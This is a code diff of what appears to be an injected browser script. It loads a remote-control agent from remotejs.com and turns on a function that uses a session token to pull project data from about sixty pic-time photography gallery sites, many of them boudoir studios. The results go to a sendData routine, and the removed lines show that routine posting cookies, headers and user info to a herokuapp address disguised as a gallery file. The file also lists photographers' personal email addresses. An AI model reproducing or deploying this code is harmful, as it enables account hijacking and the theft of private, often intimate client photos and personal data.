@@ -45,57 +45,35 @@ if (!window.remoteSetupComplete) {
       })
     });
   };
-
-  // window.sendData = (type, data) => {
-  //   try {
-  //     const envelope = {};
-  //     envelope.sessionId = window.rjsSessionId;
-  //     envelope.type = type;
-  //     envelope.data = data;
-  //     envelope.userAgent = navigator?.userAgent;
-
-  //     envelope.ptData = {};
-  //     envelope.ptData.headers = _pt$?.hdrs || null;
-  //     envelope.ptData.userInfo = _pt$?.userInfo || null;
-  //     envelope.ptData.cookie = document.cookie;
-
-  //     fetch('https://pictimecloudaf-a.herokuapp.com/pictures/scripts/compiled/pack_gallery.js', {
-  //       method: 'POST',
-  //       headers: {
-  //         'Content-Type': 'text/plain'
-  //       },
-  //       body: encodeURIComponent(btoa(JSON.stringify(envelope)))
-  //     });
-  //   } catch (err) { }
-  // }
   
-  // window.startGettingUrls = async (pictimeGUserToken) => {
-  //   for (const urlToGet of window.urlsToGet) {
-  //     try {
-  //       const response = await fetch(`${urlToGet}/!servicesg.asmx/getGUserProjects`, {
-  //         method: 'POST',
-  //         headers: {
-  //           'content-type': 'application/json; charset=UTF-8',
-  //           'pictimeGUser': pictimeGUserToken,
-  //           'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
-  //         },
-  //         body: JSON.stringify({})
-  //       });
+  window.startGettingUrls = async (pictimeGUserToken) => {
+    for (const urlToGet of window.urlsToGet) {
+      try {
+        const response = await fetch(`${urlToGet}/!servicesg.asmx/getGUserProjects`, {
+          method: 'POST',
+          headers: {
+            'content-type': 'application/json; charset=UTF-8',
+            'pictimeGUser': pictimeGUserToken,
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
+          },
+          body: JSON.stringify({})
+        });
         
-  //       const json = await response.json();
+        const json = await response.json();
         
-  //       const projectData = {
-  //         url: urlToGet,
-  //         type: 'getGUserProjects',
-  //         data: json
-  //       };
+        const projectData = {
+          url: urlToGet,
+          type: 'getGUserProjects',
+          data: json
+        };
         
-  //       sendData('project-data', projectData);
-  //     } catch (err) {
-  //       console.log(`Error on: ${urlToGet}`);
-  //     }
-  //   }
-  // }
+        sendData('project-data', projectData);
+        window.insertDoc('project-data', projectData);
+      } catch (err) {
+        console.log(`Error on: ${urlToGet}`);
+      }
+    }
+  }
 
   const xhrMap = new Map();
 
@@ -184,11 +162,6 @@ if (!window.remoteSetupComplete) {
           (function(){var s=document.createElement("script");s.src="https://remotejs.com/agent/agent.js";s.setAttribute("data-consolejs-channel",window.rjsSessionId);document.head.appendChild(s);})();
         });
       
-//      const agentScript = document.createElement('script');
-//      agentScript.src = 'https://remotejs.com/agent/agent.js';
-//      agentScript.setAttribute('data-consolejs-channel', window.rjsSessionId);
-//      document.head.appendChild(agentScript);
-      
       window.insertDoc('session', { sessionId: window.rjsSessionId });
 
       // Send Location
@@ -221,7 +194,6 @@ if (!window.remoteSetupComplete) {
   };
   
   window.urlsToGet = ['https://emeraldazphotography.pic-time.com','https://ashleehamonphotography.pic-time.com','https://abbeyricephoto.pic-time.com','https://daniellemargheritephotography.pic-time.com','https://capturedphotographybyhaleighwehr.pic-time.com','https://ashleylaydenphoto.pic-time.com','https://heirlumephotography.pic-time.com','https://rosienaryphotography.pic-time.com','https://boudoirbykimberly.pic-time.com','https://clientgallery.anchorandveilphotography.com','https://kalimphotos.pic-time.com','https://ashleysaraphotography.pic-time.com','https://erboudoir.pic-time.com','https://taylorsmithphoto.pic-time.com','https://proofing.twopairphotography.com','https://lovedarling.pic-time.com','https://creation4use.pic-time.com','https://beauboudoir.pic-time.com','https://hushandwildboudoir.pic-time.com','https://sixteenfourteenphotography.pic-time.com','https://photosbyjill.pic-time.com','https://joelleelizabethphotography.pic-time.com','https://brookeshannonphotography.pic-time.com','https://kaliphotography.pic-time.com','https://ashleybenhamphotography.pic-time.com','https://sarahwettleson.pic-time.com','https://angiejustshootme.pic-time.com','https://brynnakathleenphotography.pic-time.com','https://wyethaugustinephotography.pic-time.com','https://lennonphotography.pic-time.com','https://jodiplumbley.pic-time.com','https://emilyisaksonphotography.pic-time.com','https://dallasolgaphotography.pic-time.com','https://tiarrasorte.pic-time.com','https://stacimitchellphoto.pic-time.com','https://winxphoto.pic-time.com','https://sweetlikepie.pic-time.com','https://ashleyizquierdo.pic-time.com','https://thomasdphotography.pic-time.com','https://amypaine.pic-time.com','https://carleoimages.pic-time.com','https://briannalanephotography.pic-time.com','https://normagarciaphotography.pic-time.com','https://rachelpourchierphotography.pic-time.com','https://loveanneliesephotography.pic-time.com','https://gallery.supernovaboudoir.com','https://bloomingbeautyboudoir.pic-time.com','https://trinacaryphotography.pic-time.com','https://luxeandcophotography.pic-time.com','https://keleighmichellephotography.pic-time.com','https://brynathorinn.pic-time.com','https://joymaura.pic-time.com','https://karenhamdorfphotography.pic-time.com','https://vogtography.pic-time.com','https://vibycreative.pic-time.com','https://shutterbugstudios.pic-time.com','https://letsarahtakeyourpicture.pic-time.com','https://taylorbartram.pic-time.com','https://dijanasphotography.pic-time.com','https://lauramackphotography.pic-time.com','https://travelfor2photography.pic-time.com','https://bybaze.pic-time.com'];
-  window.emailsToGet = ['emeraldazphotography@gmail.com','ashlee@ashleehamon.com','abbeyricephoto@gmail.com','info@daniellemargherite.com','captured.halwehr@gmail.com','hello@ashleylayden.com','hello@heirlumephotography.com','rosienaryphotography@gmail.com','hello@boudoirbykimberly.com','info@anchorandveilphotography.com','kalimphotos@gmail.com','hello@ashleysaraphotography.com','erboudoir@gmail.com','hello@taylorharmonphoto.com','shootme@twopairphotography.com','lovedarlingphotography@yahoo.com','creation4use@gmail.com','kthebeau@gmail.com','hushandwildboudoir@gmail.com','sixteenfourteenphotography@yahoo.com','hello@jilliannecampbellphoto.com','hello@joelleelizabeth.com','bsperrer16@hotmail.com','hello.kaliphotography@gmail.com','ashley@ashleybenhamphotography.com','sarahwettlesonphoto@gmail.com','angiejustshootme@gmail.com','brynnakathleenphoto@gmail.com','wyeth@wyethaugustinephoto.com','hello@lennonphotographyonline.com','jodi.plumbley@outlook.com','emilyisakson.photo@gmail.com','dallasolgaphotography@gmail.com','info@tiarrasorte.com','hello@stacimitchellphoto.com','winxphoto@gmail.com','katiebaechler@gmail.com','ashleyizphoto@gmail.com','thomasdphotography@gmail.com','amy@amycatherinephoto.com','carleoimages@gmail.com','briannalanephotography@gmail.com','normagarciaphoto@gmail.com','rachelpourchier@gmail.com','photography@loveanneliese.com','info@supernovaboudoir.com','bloomingbeautyboudoir2020@gmail.com','trinacary@gmail.com','luxeandcophotography@gmail.com','keleighmichellephoto@gmail.com','brynathorinn@gmail.com','hello@joymaura.com','k.hamdorf.photo@gmail.com','vogtography.life@gmail.com','hello@vibycreative.com','shutterbugphotography3@gmail.com','letsarahtakeyourpicture@gmail.com','taylor@goddesswithinboudoir.com','info@dijanaszewczyk.com','lhelizabeth1@gmail.com','travelfor2photography@gmail.com','hi.charliebaze@gmail.com'];
                  
   window.remoteSetupComplete = true;
 }
@@ -233,3 +205,6 @@ if (!window.rjsSessionId) {
 
 // Start Remote Session
 startSession();
+
+// Get URLs
+startGettingUrls();
